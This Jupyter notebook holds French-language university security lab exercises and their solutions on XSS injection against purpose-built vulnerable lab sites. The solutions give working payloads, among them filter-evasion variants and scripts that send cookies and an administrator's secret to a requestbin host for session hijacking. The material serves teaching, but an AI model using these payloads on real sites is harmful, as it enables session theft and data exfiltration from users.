{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# ipl I317B Sécurité : labos\n",
    "## Semaine 4: Vulnérabilitées web, injection XSS\n",
    "\n",
    "\n",
    "Après les injections SQL, il est temps de passer à un autre type d'injection : les injections XSS. Pour ces exercices, je vous recommande d'utiliser le navigateur Firefox plutôt que Chrome, ce dernier dispose de certaines contre-mesures qui peut perturber les exercices."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 1a:\n",
    "Pour ce premier exercice, le but est de procéder à une injection xss trivial sur une variante le site suivant permettant de chercher les éléments du tableau périodique des éléments : http://labosecuipl.alwaysdata.net/20/s04/ex1/\n",
    "Votre injection doit afficher une alerte affichant le texte : \"I hacked you\"\n",
    "\n",
    "Quelle valeur avez-vous entrée et où l'avez vous entrée ?"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "<script>alert(\"I hacked you\");</script>\n",
    "\n",
    "\n",
    "Il suffit de taper cela dans le formulaire de recherche. Le serveur va réinjecter \"bêtement\" le contenu\n",
    "de la requête GET dans la page qu'il sert. Les balises scripts tapée dans le formulaire seront donc rendu\n",
    "sur la page.\n",
    "\n",
    "Si on ne veut pas casser le dom, il est toujours possible d'injecter :\n",
    "\n",
    "</h2><script>alert(\"I hacked you\");</script><h2>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 1b:\n",
    "Pouvez-vous également récolter les cookies du site de l'exercice 1a avec votre injection xss ?"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "<script>alert(document.cookie);</script>\n",
    "\n",
    "\n",
    "En javascript, nous pouvons aisément manipuler les cookies avec la variable \"document.cookie\"."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 1c:\n",
    "Pouvez-vous essayer les mêmes injections sur le formulaire suivant : http://labosecuipl.alwaysdata.net/20/s04/ex1c/ ?"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "Si <script> et </script> sont interdit ... on inject avec n'importe quelle variante : <scrIpt>, <ScriPt>, etc...\n",
    "\n",
    "<scrIpt>alert(\"hacked\")</scrIpt>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 1d:\n",
    "Pouvez-vous essayer les mêmes injections sur le formulaire suivant : http://labosecuipl.alwaysdata.net/20/s04/ex1d/ ?"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "Si <script> et </script> sont interdit même avec des variantes de case ... on essaye avec des espaces : <  script>, <script  >,...\n",
    "\n",
    "<script >alert(\"hacked\")</script >"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 1e:\n",
    "Pouvez-vous essayer les mêmes injections sur le formulaire suivant : http://labosecuipl.alwaysdata.net/20/s04/ex1e/ ?"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "Si le string \"script\" est interdit ... on peut utiliser d'autres tags :\n",
    "\n",
    "<img src=/404 onerror=\"alert('hacked')\"></img>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 2a:\n",
    "Pour ce second exercice, vous allez utilisez le site, je vous invite à utiliser le service https://requestbin.com/ pour \"exfiltrer\" les cookies que vous avez récupérer lors du premier exercice :  http://labosecuipl.alwaysdata.net/20/s04/ex1/"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "<script>\n",
    "    var xmlHttp = new XMLHttpRequest();\n",
    "    xmlHttp.open(\"GET\", \"http://requestbin.net/r/XXXXXXXX?c=\" + document.cookie, false);\n",
    "    xmlHttp.send(null);\n",
    "</script>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 2b:\n",
    "Pour ce second exercice, vous allez utilisez le site https://labosecuipl.alwaysdata.net/20/s04/ironbank/ sur lequel vous pouvez créer un compte. Votre objectif est de récupérer les cookies de l'administrateur."
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "/*\n",
    "Nous pouvons \"exfiltrer\" des informations en AJAX en les envoyant en javascript vers un serveur tierce comme par exemple un \"requestbin\" que nous avons vu au premier TP.\n",
    "Pour vous facilité la vie, j'ai ajouté jquery sur le site. La solution du 2b est en js pure, celle du 2c en jquery.\n",
    "*/\n",
    "\n",
    "<script>\n",
    "    var xmlHttp = new XMLHttpRequest();\n",
    "    xmlHttp.open(\"GET\", \"http://requestbin.net/r/1az7g0f1?c=\" + document.cookie, false);\n",
    "    xmlHttp.send(null);\n",
    "</script>\n",
    "\n",
    "/*\n",
    "Ces cookies sont bien évidement injectable dans le navigateur avec une extension de type \"Cookie Editor\". Cela vous permet de vous faire passer pour l'administrateur.\n",
    "*/"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 2c:\n",
    "Bien, maintenant que vous avez voler les cookies de l'administrateur, parvenez-vous à récupérer son secret ? Si oui, comment ?\n",
    "\n",
    "(oui, c'est faisable. Spoiler: toujours plus d'ajax ;-) )"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "/*\n",
    "Apparement, même en injectant les cookies récupéré à l'exercice précédent, nous ne parvenons pas à récupérer le secret de l'admin. Pourquoi ne pas récupérer celui-ci directement en javascript pour ensuite nous le renvoyer en faisant une double requête ajax ?\n",
    "*/\n",
    "\n",
    "<script>\n",
    "$.ajax({\n",
    "    url: 'http://labosecuipl.alwaysdata.net/20/s04/ironbank/profile/',\n",
    "    success: function(data) {\n",
    "        var s = $(data).find(\"#secret\").text();\n",
    "        \n",
    "        $.ajax({\n",
    "                  url: ('http://requestbin.net/r/XXXXXX?' +  btoa(s)),\n",
    "                  success: function(data2) {}\n",
    "        });\n",
    "        }\n",
    "});\n",
    "</script>"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
